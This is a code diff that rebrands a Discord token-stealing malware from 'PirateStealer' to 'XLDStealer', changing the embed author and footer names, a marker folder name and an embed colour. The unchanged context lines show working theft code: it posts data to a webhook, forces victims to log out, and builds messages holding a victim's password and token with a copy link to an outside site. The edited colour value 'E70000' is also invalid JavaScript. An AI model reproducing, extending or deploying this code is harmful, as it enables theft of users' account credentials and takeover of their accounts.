@@ -12,7 +12,7 @@ const computerName = os.hostname(),
     logout: "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
     "init-notify": "%INITNOTI%",
-    "embed-color": 3447704,
+    "embed-color": E70000,
     "disable-qr-code": "%DISABLEQRCODE%",
   };
 function FirstTime() {
@@ -93,9 +93,9 @@ function FirstTime() {
               SendToWebhook(JSON.stringify(a));
             });
         }
-      if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return !0;
+      if (!fs.existsSync(path.join(__dirname, "XLDStealerBTW"))) return !0;
       if (
-        (fs.rmdirSync(path.join(__dirname, "PirateStealerBTW")),
+        (fs.rmdirSync(path.join(__dirname, "XLDStealerBTW")),
         "false" != config.logout || "%LOGOUT%" == config.logout)
       ) {
         if ("true" == config["logout-notify"])
@@ -114,8 +114,8 @@ function FirstTime() {
                       inline: !1,
                     },
                   ],
-                  author: { name: "PirateStealer" },
-                  footer: { text: "PirateStealer" },
+                  author: { name: "XLDStealer" },
+                  footer: { text: "XLDStealer" },
                   thumbnail: { url: "https://ibb.co/nmDLGCT" },
                 },
               ],
@@ -563,7 +563,7 @@ function ChangeEmail(e, t, n) {
                       { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                       { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !0 },
                     { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0}, ],
-                    author: { name: "XLDPirateStealer" },
+                    author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
                       url: `https://cdn.discordapp.com/avatars/${s.id}/${s.avatar}`,
